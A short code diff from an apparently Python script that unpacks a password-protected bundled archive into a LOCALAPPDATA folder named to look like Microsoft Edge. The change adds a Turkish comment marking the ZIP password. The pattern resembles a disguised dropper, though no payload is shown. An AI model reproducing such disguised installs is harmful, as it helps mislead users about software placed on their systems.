@@ -55,4 +55,4 @@ if __name__ == "__main__":
 
     src1 = resource_path('MICROSOFT--EDGE')
     dst1 = os.path.join(os.getenv('LOCALAPPDATA'), 'MICROSOFT--EDGE')
-    process_files(src1, dst1, b'72222')
+    process_files(src1, dst1, b'72222')  # ZIP şifresi burada
